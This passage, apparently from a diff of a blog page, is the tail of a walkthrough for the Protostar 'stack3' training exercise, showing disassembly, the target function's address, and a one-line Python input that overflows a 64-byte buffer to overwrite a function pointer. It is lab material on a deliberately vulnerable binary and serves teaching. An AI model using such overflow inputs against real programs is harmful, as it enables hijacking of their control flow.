&lt;__do_global_ctors_aux&gt;:</span><br><span class="line"> 80484f0: 55                    push   %ebp</span><br><span class="line"> 80484f1: 89 e5                 mov    %esp,%ebp</span><br><span class="line"> 80484f3: 53                    push   %ebx</span><br><span class="line"> 80484f4: 83 ec 04              sub    <span class="variable">$0x4</span>,%esp</span><br><span class="line"> 80484f7: a1 94 95 04 08        mov    0x8049594,%eax</span><br><span class="line"> 80484fc: 83 f8 ff              cmp    <span class="variable">$0xffffffff</span>,%eax</span><br><span class="line"> 80484ff: 74 13                 je     8048514 &lt;__do_global_ctors_aux+0x24&gt;</span><br><span class="line"> 8048501: bb 94 95 04 08        mov    <span class="variable">$0x8049594</span>,%ebx</span><br><span class="line"> 8048506: 66 90                 xchg   %ax,%ax</span><br><span class="line"> 8048508: 83 eb 04              sub    <span class="variable">$0x4</span>,%ebx</span><br><span class="line"> 804850b: ff d0                 call   *%eax</span><br><span class="line"> 804850d: 8b 03                 mov    (%ebx),%eax</span><br><span class="line"> 804850f: 83 f8 ff              cmp    <span class="variable">$0xffffffff</span>,%eax</span><br><span class="line"> 8048512: 75 f4                 jne    8048508 &lt;__do_global_ctors_aux+0x18&gt;</span><br><span class="line"> 8048514: 83 c4 04              add    <span class="variable">$0x4</span>,%esp</span><br><span class="line"> 8048517: 5b                    pop    %ebx</span><br><span class="line"> 8048518: 5d                    pop    %ebp</span><br><span class="line"> 8048519: c3                    ret    </span><br><span class="line"> 804851a: 90                    nop</span><br><span class="line"> 804851b: 90                    nop</span><br><span class="line"></span><br><span class="line">Disassembly of section .fini:</span><br><span class="line"></span><br><span class="line">0804851c &lt;_fini&gt;:</span><br><span class="line"> 804851c: 55                    push   %ebp</span><br><span class="line"> 804851d: 89 e5                 mov    %esp,%ebp</span><br><span class="line"> 804851f: 53                    push   %ebx</span><br><span class="line"> 8048520: 83 ec 04              sub    <span class="variable">$0x4</span>,%esp</span><br><span class="line"> 8048523: e8 00 00 00 00        call   8048528 &lt;_fini+0xc&gt;</span><br><span class="line"> 8048528: 5b                    pop    %ebx</span><br><span class="line"> 8048529: 81 c3 54 11 00 00     add    <span class="variable">$0x1154</span>,%ebx</span><br><span class="line"> 804852f: e8 6c fe ff ff        call   80483a0 &lt;__do_global_dtors_aux&gt;</span><br><span class="line"> 8048534: 59                    pop    %ecx</span><br><span class="line"> 8048535: 5b                    pop    %ebx</span><br><span class="line"> 8048536: c9                    leave  </span><br><span class="line"> 8048537: c3                    ret</span><br></pre></td></tr></table></figure>
+<p>here we can see the adress of the function : <b>08048424</b></p>
+<p>Let’s test that :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:/opt/protostar/bin$ py -c <span class="string">'print 64*"a"+"\x24\x84\x04\x08"'</span> | ./stack3</span><br><span class="line">calling <span class="keyword">function</span> pointer, jumping to 0x08048424</span><br><span class="line">code flow successfully changed</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://slayne.github.io/2016/02/01/stack3/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://slayne.github.io/2016/02/01/stack3/&text=Protostar vm, stack3"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://slayne.github.io/2016/02/01/stack3/&title=Protostar vm, stack3"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://slayne.github.io/2016/02/01/stack3/&is_video=false&description=Protostar vm, stack3"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Protostar vm, stack3&body=Check out this article: http://slayne.github.io/2016/02/01/stack3/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://slayne.github.io/2016/02/01/stack3/&title=Protostar vm, stack3"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://slayne.github.io/2016/02/01/stack3/&title=Protostar vm, stack3"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://slayne.github.io/2016/02/01/stack3/&title=Protostar vm, stack3"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://slayne.github.io/2016/02/01/stack3/&title=Protostar vm, stack3"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://slayne.github.io/2016/02/01/stack3/&name=Protostar vm, stack3&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 slayne
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
